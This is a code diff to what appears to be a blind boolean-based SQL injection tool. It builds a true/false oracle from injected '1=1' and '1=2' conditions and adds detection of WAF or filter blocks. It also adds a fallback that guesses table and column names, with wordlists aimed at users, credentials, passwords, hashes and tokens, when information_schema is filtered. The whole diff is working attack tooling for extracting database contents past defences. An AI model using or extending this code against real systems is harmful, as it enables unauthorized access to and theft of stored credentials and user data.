@@ -113,13 +113,16 @@ def _inject(http, url: str, param: str, value: str) -> str:
 class Oracle:
     """A yes/no question to the database: ask(condition) -> True/False."""
 
-    def __init__(self, http, url, param, value, template, context, true_text, false_text, console=None):
+    def __init__(self, http, url, param, value, template, context, true_text, false_text,
+                 threshold=0.9, console=None):
         self.http = http
         self.url, self.param, self.value = url, param, value
         self.template, self.context = template, context
         self._true, self._false = true_text, false_text
+        self.threshold = threshold       # below this on *both* pages = an anomaly (see ask)
         self.console = console
         self.cache = None        # a sqlcache.Cache once a walk starts (resume/skip)
+        self.blocked = 0         # responses matching neither page (WAF / error / filter)
 
     @property
     def count(self):
@@ -132,8 +135,16 @@ class Oracle:
         body = _inject(self.http, self.url, self.param, payload)
         if not body:                    # timeout / empty: don't bias the search to True
             return False
-        return (difflib.SequenceMatcher(None, body, self._true).ratio()
-                >= difflib.SequenceMatcher(None, body, self._false).ratio())
+        rt = difflib.SequenceMatcher(None, body, self._true).ratio()
+        rf = difflib.SequenceMatcher(None, body, self._false).ratio()
+        # A response close to neither calibrated page is a *third* state — an
+        # error/WAF/filter block (e.g. a denylisted keyword). Don't let it pass as
+        # a clean True/False bit silently: count it, so the walk can warn and fall
+        # back. The bit decision itself stays relative (unchanged), so a normal
+        # walk is unaffected.
+        if rt < self.threshold and rf < self.threshold:
+            self.blocked += 1
+        return rt >= rf
 
 
 def _sim(a, b):
@@ -146,8 +157,14 @@ def calibrate(http, url, param, value, console=None):
         t = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
         f = _inject(http, url, param, tmpl.format(v=value, c="1=2"))
         if t and _sim(t, f) < 0.95:                 # the condition visibly moves the page
-            o = Oracle(http, url, param, value, tmpl, context, t, f, console)
+            # Threshold between the two pages: a response far below it on *both* is
+            # neither — an error/WAF block, not a clean answer (used for anomaly
+            # detection in ask, never for the bit decision).
+            threshold = min(0.95, (1.0 + _sim(t, f)) / 2)
+            o = Oracle(http, url, param, value, tmpl, context, t, f,
+                       threshold=threshold, console=console)
             if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
+                o.blocked = 0                        # calibration probes don't count
                 return o
     return None
 
@@ -275,6 +292,46 @@ def _list(oracle, prof, count_expr, at_tmpl, **fmt):
     n = extract_int(oracle, count_expr.format(**fmt))
     for k in range(n):
         yield extract_str(oracle, prof, at_tmpl.format(k=k, **fmt))
+
+
+# When the catalog (information_schema) is blocked or empty, fall back to
+# probing existence by name — `SELECT count(*) FROM <t>` errors (reads False) if
+# the table isn't there, succeeds (True) if it is. No information_schema needed.
+_COMMON_TABLES = [
+    "users", "user", "admin", "admins", "administrator", "accounts", "account",
+    "members", "member", "customers", "customer", "clients", "people", "persons",
+    "staff", "employees", "login", "logins", "credentials", "auth", "authentication",
+    "profiles", "profile", "sessions", "session", "settings", "config", "configuration",
+    "news", "articles", "article", "posts", "post", "pages", "page", "comments",
+    "products", "product", "orders", "order", "items", "categories", "category",
+    "messages", "message", "logs", "log", "events", "tokens", "keys", "secrets",
+]
+_COMMON_COLUMNS = [
+    "id", "user", "username", "user_name", "name", "login", "email", "mail",
+    "pass", "passwd", "password", "pwd", "hash", "secret", "token", "role",
+    "is_admin", "admin", "first_name", "last_name", "fullname", "created",
+    "updated", "data", "value", "active", "status",
+]
+
+
+def _exists(oracle, expr) -> bool:
+    """True if `expr` runs without error — i.e. the table/column is really there."""
+    return oracle.ask(f"({expr})>=0")
+
+
+def common_tables(oracle, names=None):
+    """Yield the table names (from a common-name list) that actually exist —
+    a name-guessing path for when information_schema is filtered."""
+    for t in (names or _COMMON_TABLES):
+        if _exists(oracle, f"SELECT count(*) FROM {t}"):
+            yield t
+
+
+def common_columns(oracle, table, names=None):
+    """Yield the columns of `table` that exist, by name (no information_schema)."""
+    for col in (names or _COMMON_COLUMNS):
+        if _exists(oracle, f"SELECT count({col}) FROM {table}"):
+            yield col
 
 
 def tables(oracle, prof):
